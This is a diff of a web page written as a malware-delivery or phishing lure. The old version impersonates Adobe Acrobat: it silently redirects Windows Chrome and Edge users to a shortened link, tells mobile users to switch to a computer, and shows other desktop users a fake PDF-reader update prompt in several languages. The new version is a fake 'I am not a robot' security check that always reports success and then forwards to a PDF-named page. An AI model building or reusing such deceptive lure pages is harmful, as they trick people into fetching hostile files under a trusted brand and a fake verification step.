@@ -1,187 +1,209 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="auto">
 <head>
 <meta charset="UTF-8">
-<title> PDF </title>
-<link rel="shortcut icon" href="https://acrobat.adobe.com/favicon.ico" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Verification</title>
+
 <style>
-    body {
-        margin: 0;
-        padding: 0;
-        font-family: Arial, Helvetica, sans-serif;
-        background: #f5f5f5;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f5f7fa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
 
-    .box {
-        background: #fff;
-        max-width: 420px;
-        width: 100%;
-        padding: 30px;
-        text-align: center;
-        border-radius: 6px;
-        box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
+.box {
+    background: #ffffff;
+    width: 400px;
+    padding: 40px;
+    border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+    text-align: center;
+}
 
-    .logo {
-        width: 120px;
-        margin-bottom: 20px;
-    }
+.logo {
+    font-size: 20px;
+    font-weight: bold;
+    color: #ff6b00;
+    margin-bottom: 20px;
+}
 
-    h1 {
-        font-size: 20px;
-        margin-bottom: 15px;
-        color: #333;
-    }
+h2 {
+    margin-bottom: 10px;
+    color: #333;
+}
 
-    p {
-        font-size: 14px;
-        color: #555;
-        line-height: 1.6;
-    }
+p {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 25px;
+}
 
-    button {
-        margin-top: 20px;
-        padding: 12px 25px;
-        background: #d32f2f;
-        border: none;
-        color: #fff;
-        font-size: 14px;
-        cursor: pointer;
-        border-radius: 4px;
-    }
+.verify-box {
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    padding: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    cursor: pointer;
+    transition: 0.3s;
+}
 
-    button:hover {
-        background: #b71c1c;
-    }
+.verify-box:hover {
+    border-color: #ff6b00;
+    box-shadow: 0 0 8px rgba(255,107,0,0.2);
+}
+
+.checkbox {
+    width: 20px;
+    height: 20px;
+    border: 2px solid #888;
+    border-radius: 4px;
+    display: inline-block;
+    position: relative;
+}
+
+.checkbox.checked {
+    background: #ff6b00;
+    border-color: #ff6b00;
+}
+
+.checkbox.checked::after {
+    content: "✓";
+    color: white;
+    position: absolute;
+    top: -3px;
+    left: 3px;
+    font-size: 16px;
+}
+
+.status {
+    margin-top: 20px;
+    font-size: 14px;
+    color: green;
+    display: none;
+}
 </style>
 </head>
 
 <body>
+
 <div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Adobe_Acrobat_DC_logo_2020.png" class="logo">
-    <h1 id="title"></h1>
-    <p id="paragraph"></p>
+    <div class="logo">Security Check</div>
+    <h2 id="titleText"></h2>
+    <p id="descText"></p>
+
+    <div class="verify-box" onclick="verificar()">
+        <div>
+            <span class="checkbox" id="check"></span>
+            <span id="checkboxText" style="margin-left:10px;"></span>
+        </div>
+        <div>🔒</div>
+    </div>
+
+    <div class="status" id="status"></div>
 </div>
 
 <script>
-window.onload = function () {
+const idiomaCompleto = navigator.language || navigator.userLanguage;
+const lang = idiomaCompleto.toLowerCase();
 
-    const ua = navigator.userAgent || "";
-    const isWindows = ua.includes("Windows");
-    const isChrome = ua.includes("Chrome") && !ua.includes("Edg/");
-    const isEdge = ua.includes("Edg/");
-    const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
+const textos = {
 
-    // ✅ Lista de idiomas (ordem real do dispositivo)
-    const langsRaw = (navigator.languages && navigator.languages.length)
-        ? navigator.languages
-        : [navigator.language || "en"];
+    "pt-pt": {
+        titulo: "Confirme que é humano",
+        descricao: "Estamos a verificar a sua ligação antes de continuar.",
+        botao: "Não sou um robô",
+        sucesso: "✔ Verificação concluída com sucesso."
+    },
 
-    const langs = langsRaw
-        .map(l => (l || "en").toLowerCase())
-        .filter(Boolean);
+    "pt-br": {
+        titulo: "Confirme que você é humano",
+        descricao: "Estamos verificando sua conexão antes de continuar.",
+        botao: "Não sou um robô",
+        sucesso: "✔ Verificação concluída com sucesso."
+    },
 
-    // ✅ Windows → mantém igual
-    if (isWindows && (isChrome || isEdge)) {
-        document.body.innerHTML = "";
-        window.location.href = "https://t.co/BrIpaUMqEY";
-        return;
+    es: {
+        titulo: "Confirme que es humano",
+        descricao: "Estamos verificando su conexión antes de continuar.",
+        botao: "No soy un robot",
+        sucesso: "✔ Verificación completada con éxito."
+    },
+
+    en: {
+        titulo: "Confirm you are human",
+        descricao: "We are verifying your connection before continuing.",
+        botao: "I am not a robot",
+        sucesso: "✔ Verification completed successfully."
+    },
+
+    de: {
+        titulo: "Bestätigen Sie, dass Sie ein Mensch sind",
+        descricao: "Wir überprüfen Ihre Verbindung, bevor Sie fortfahren.",
+        botao: "Ich bin kein Roboter",
+        sucesso: "✔ Überprüfung erfolgreich abgeschlossen."
+    },
+
+    fr: {
+        titulo: "Confirmez que vous êtes humain",
+        descricao: "Nous vérifions votre connexion avant de continuer.",
+        botao: "Je ne suis pas un robot",
+        sucesso: "✔ Vérification réussie."
+    },
+
+    it: {
+        titulo: "Conferma di essere umano",
+        descricao: "Stiamo verificando la tua connessione prima di continuare.",
+        botao: "Non sono un robot",
+        sucesso: "✔ Verifica completata con successo."
+    },
+
+    tr: {
+        titulo: "İnsan olduğunuzu doğrulayın",
+        descricao: "Devam etmeden önce bağlantınız doğrulanıyor.",
+        botao: "Robot değilim",
+        sucesso: "✔ Doğrulama başarıyla tamamlandı."
     }
-
-    // Dicionários (mobile)
-    const mobileTitle = {
-        "pt-pt": "Documento indisponível",
-        "pt-br": "Documento indisponível",
-        "pt":    "Documento indisponível",
-        "es": "Documento no disponible",
-        "fr": "Document indisponible",
-        "de": "Dokument nicht verfügbar",
-        "it": "Documento non disponibile",
-        "tr": "Belge kullanılamıyor",
-        "en": "Document unavailable"
-    };
-
-    const mobileMsg = {
-        "pt-pt": "Este documento não pode ser visualizado no telemóvel. Por favor, abra num computador.",
-        "pt-br": "Este documento não pode ser visualizado no celular. Por favor, abra em um computador.",
-        "pt":    "Este documento não pode ser visualizado no telemóvel. Por favor, abra num computador.",
-        "es": "Este documento no se puede ver en el móvil. Ábralo en un ordenador.",
-        "fr": "Ce document ne peut pas être affiché sur mobile. Veuillez l’ouvrir sur un ordinateur.",
-        "de": "Dieses Dokument kann auf dem Handy nicht angezeigt werden. Bitte öffnen Sie es auf einem Computer.",
-        "it": "Questo documento non può essere visualizzato sul cellulare. Aprilo su un computer.",
-        "tr": "Bu belge telefonda görüntülenemez. Lütfen bir bilgisayarda açın.",
-        "en": "This document cannot be viewed on mobile. Please open it on a computer."
-    };
-
-    // ✅ Escolhe UMA chave final (a mesma para título e mensagem)
-    function pickKey(dictA, dictB) {
-        // tenta primeiro o idioma completo (pt-PT), depois base (pt)
-        for (const l of langs) {
-            const base = l.split("-")[0];
-            if (dictA[l] && dictB[l]) return l;
-            if (dictA[base] && dictB[base]) return base;
-        }
-        return "en";
-    }
-
-    if (isMobile) {
-        const key = pickKey(mobileTitle, mobileMsg);
-
-        document.documentElement.setAttribute("lang", key);
-        document.getElementById("title").innerText = mobileTitle[key] || mobileTitle["en"];
-        document.getElementById("paragraph").innerText = mobileMsg[key] || mobileMsg["en"];
-        return;
-    }
-
-    // Desktop (não Windows): mantém conteúdo (para não ficar vazio)
-    const desktopTitle = {
-        "pt-pt": "Adobe Acrobat Reader: Ler PDF",
-        "pt-br": "Adobe Acrobat Reader: Ler PDF",
-        "pt":    "Adobe Acrobat Reader: Ler PDF",
-        "es": "Adobe Acrobat Reader: Leer PDF",
-        "fr": "Adobe Acrobat Reader : Lire le PDF",
-        "de": "Adobe Acrobat Reader: PDF lesen",
-        "it": "Adobe Acrobat Reader: Leggi il PDF",
-        "tr": "Adobe Acrobat Reader: PDF görüntüle",
-        "en": "Adobe Acrobat Reader: Read PDF"
-    };
-
-    const desktopText = {
-        "pt-pt": "Atualizações disponíveis.<br><br>• Para visualizar este ficheiro PDF, é necessário atualizar a aplicação de leitura de PDF.<br><br>Após a atualização, poderá visualizar o ficheiro.",
-        "pt-br": "Atualizações disponíveis.<br><br>• Para visualizar este arquivo PDF, é necessário atualizar o aplicativo de leitura de PDF.<br><br>Após a atualização, será possível visualizar o arquivo.",
-        "pt":    "Atualizações disponíveis.<br><br>• Para visualizar este ficheiro PDF, é necessário atualizar a aplicação de leitura de PDF.<br><br>Após a atualização, poderá visualizar o ficheiro.",
-        "es": "Actualizaciones disponibles.<br><br>• Para ver este archivo PDF, necesitas actualizar tu lector de PDF.<br><br>Después de la actualización, podrás ver el archivo.",
-        "fr": "Mises à jour disponibles.<br><br>• Pour afficher ce fichier PDF, vous devez mettre à jour votre lecteur PDF.<br><br>Après la mise à jour, vous pourrez afficher le fichier.",
-        "de": "Updates verfügbar.<br><br>• Um diese PDF-Datei anzuzeigen, müssen Sie Ihren PDF-Reader aktualisieren.<br><br>Nach dem Update können Sie die Datei anzeigen.",
-        "it": "Aggiornamenti disponibili.<br><br>• Per visualizzare questo PDF, è necessario aggiornare il lettore PDF.<br><br>Dopo l’aggiornamento sarà possibile visualizzare il file.",
-        "tr": "Güncellemeler mevcut.<br><br>• Bu PDF dosyasını görüntülemek için PDF okuyucunuzu güncellemeniz gerekir.<br><br>Güncellemeden sonra dosyayı görüntüleyebilirsiniz.",
-        "en": "Updates available.<br><br>• To view this PDF file, you need to update your PDF reader.<br><br>After the update, you will be able to view the file."
-    };
-
-    // Desktop key único também
-    function pickKeySingle(dict) {
-        for (const l of langs) {
-            const base = l.split("-")[0];
-            if (dict[l]) return l;
-            if (dict[base]) return base;
-        }
-        return "en";
-    }
-
-    const k1 = pickKeySingle(desktopTitle);
-    const k2 = pickKeySingle(desktopText);
-    const k = (k1 === k2) ? k1 : (desktopTitle[k1] && desktopText[k1] ? k1 : (desktopTitle[k2] && desktopText[k2] ? k2 : "en"));
-
-    document.documentElement.setAttribute("lang", k);
-    document.getElementById("title").innerText = desktopTitle[k] || desktopTitle["en"];
-    document.getElementById("paragraph").innerHTML = desktopText[k] || desktopText["en"];
 };
+
+let t = textos["en"];
+
+if (textos[lang]) {
+    t = textos[lang];
+} else {
+    const baseLang = lang.substring(0,2);
+    if (textos[baseLang]) {
+        t = textos[baseLang];
+    }
+}
+
+document.getElementById("titleText").innerText = t.titulo;
+document.getElementById("descText").innerText = t.descricao;
+document.getElementById("checkboxText").innerText = t.botao;
+
+function verificar() {
+    let check = document.getElementById("check");
+    let status = document.getElementById("status");
+
+    check.classList.add("checked");
+
+    setTimeout(() => {
+        status.innerText = t.sucesso;
+        status.style.display = "block";
+    }, 700);
+
+    setTimeout(() => {
+        window.location.href = "PL10-02-2026L-pdf.html";
+    }, 2000);
+}
 </script>
+
 </body>
 </html>
 
